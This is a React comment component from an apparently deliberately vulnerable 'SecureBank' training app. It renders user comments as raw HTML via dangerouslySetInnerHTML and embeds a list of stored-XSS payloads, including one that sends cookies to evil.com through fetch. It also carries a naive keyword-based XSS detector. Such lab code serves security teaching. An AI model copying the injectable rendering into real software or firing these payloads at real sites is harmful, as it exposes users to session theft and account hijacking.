import React, { useState, useEffect } from 'react';
import axios from 'axios';

function Comments() {
  const [comments, setComments] = useState([]);
  const [author, setAuthor] = useState('');
  const [content, setContent] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState(null);

const API_URL = import.meta.env.VITE_API_URL || 'http://localhost:5000';

  useEffect(() => {
    loadComments();
  }, []);

  const loadComments = async () => {
    try {
      setError(null);
      // FIX: Use full URL and handle response format
      const response = await axios.get(`${API_URL}/api/comments`);
      // Handle both direct array and wrapped response
      const commentsData = Array.isArray(response.data) ? response.data : response.data.data || response.data.comments || [];
      setComments(commentsData);
    } catch (error) {
      console.error('Error loading comments:', error);
      setError('Failed to load comments');
    }
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (!content.trim()) {
      alert('Please enter a comment');
      return;
    }
    
    setIsLoading(true);
    setError(null);
    
    try {
      const response = await axios.post(`${API_URL}/api/comments`, { 
        author: author.trim() || 'Anonymous', 
        content: content 
      });
      
      // Clear form after successful post
      setAuthor('');
      setContent('');
      await loadComments();
      
      // Show success message if XSS was detected
      if (response.data.message?.includes('XSS')) {
        alert('⚠️ XSS payload detected and logged by security team!');
      }
    } catch (error) {
      console.error('Error posting comment:', error);
      setError('Error posting comment. Please try again.');
    } finally {
      setIsLoading(false);
    }
  };

  const xssPayloads = [
    { name: "Alert Box", payload: "<script>alert('Stored XSS Attack!')</script>" },
    { name: "Cookie Stealer", payload: "<img src=x onerror=\"alert('Cookie: '+document.cookie)\">" },
    { name: "Page Defacement", payload: "<script>document.body.innerHTML='<h1 style=\"color:red\">HACKED!</h1>'</script>" },
    { name: "Redirect", payload: "<script>window.location='https://example.com'</script>" },
    { name: "Steal Token", payload: "<img src=x onerror=\"fetch('http://evil.com/steal?cookie='+document.cookie)\">" }
  ];

  // Helper to check if content contains XSS
  const containsXss = (content) => {
    const xssPatterns = ['<script', 'alert', 'onerror', 'onload', 'javascript:', '<img'];
    return xssPatterns.some(pattern => content?.toLowerCase().includes(pattern));
  };

  return (
    <div className="comments-container">
      <div className="page-header">
        <div>
          <h2>💬 Customer Feedback</h2>
          <p>Share your experience with SecureBank</p>
        </div>
      </div>

      {error && (
        <div className="error-box">
          <strong>Error:</strong> {error}
        </div>
      )}

      <div className="comment-form-container">
        <h3>📝 Leave a Comment</h3>
        <form onSubmit={handleSubmit} className="comment-form">
          <input
            type="text"
            value={author}
            onChange={(e) => setAuthor(e.target.value)}
            placeholder="Your name (optional)"
            className="author-input"
          />
          <textarea
            value={content}
            onChange={(e) => setContent(e.target.value)}
            placeholder="Write your comment here... (HTML allowed - XSS vulnerable)"
            rows="4"
            className="content-input"
          />
          {containsXss(content) && (
            <div className="xss-warning">
              ⚠️ XSS pattern detected! This will be logged by security.
            </div>
          )}
          <button type="submit" disabled={isLoading}>
            {isLoading ? 'Posting...' : '📤 Post Comment'}
          </button>
        </form>
      </div>

      <div className="comments-list">
        <h3>📋 Recent Comments ({comments.length})</h3>
        {comments.map((comment) => (
          <div key={comment.id || comment.comment_id} className="comment-card">
            <div className="comment-header">
              <strong className="comment-author">👤 {comment.author || 'Anonymous'}</strong>
              <span className="comment-date">
                {new Date(comment.created_at || comment.createdAt).toLocaleString()}
              </span>
            </div>
            <div 
              className="comment-content"
              dangerouslySetInnerHTML={{ __html: comment.content }}
            />
            {containsXss(comment.content) && (
              <div className="xss-badge">⚠️ XSS Payload Detected</div>
            )}
          </div>
        ))}
        {comments.length === 0 && (
          <div className="no-comments">No comments yet. Be the first to post!</div>
        )}
      </div>
    </div>
  );
}

export default Comments;